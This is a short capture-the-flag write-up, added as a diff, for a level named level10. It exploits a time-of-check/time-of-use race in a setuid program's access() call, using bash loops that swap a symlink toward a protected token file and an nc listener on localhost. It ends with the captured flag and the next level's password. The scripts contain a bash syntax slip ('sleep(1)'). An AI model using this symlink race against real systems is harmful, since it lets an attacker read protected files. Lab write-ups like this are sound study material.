@@ -1,0 +1,46 @@
+1. ls -la
+
+2. analyze executable + test token
+
+3. create a file in /var/crash to send it to ourself and test the program
+
+4. nc -l 6969, then open another terminal and execute the command ./level10 /var/crash/myfile 127.0.0.1 ("localhost" doesn't work)
+
+5. the vulnerability is 'access': during the short lapse of time when access checks rights for a file and opens it, we must give it the forbidden token file
+
+6. create a script with infinite loop to switch symlinks from our file to token and launch script in additional terminal
+
+-----
+    #!/bin/bash
+
+    # Create file
+    touch /var/crash/myfile
+
+    # Create the initial symlink
+    ln -s /var/crash/myfile /var/crash/mylink
+
+    # Background loop to switch symlink target
+    while true; do
+        ln -sf /home/user/level10/token /var/crash/mylink
+        ln -sf /var/crash/myfile /var/crash/mylink
+    done
+-----
+    #!/bin/bash
+
+    while true; do
+            /home/user/level10/level10 /var/crash/mylink 127.0.0.1
+            sleep(1)
+    done
+-----
+    #!/bin/bash
+
+    while true; do
+            nc -l 6969
+            sleep(1)
+    done
+-----
+
+7. execute the program level10
+
+flag10: woupa2yuojeeaaed06riuj63c
+level11: feulo4b72j7edeahuete3no7c
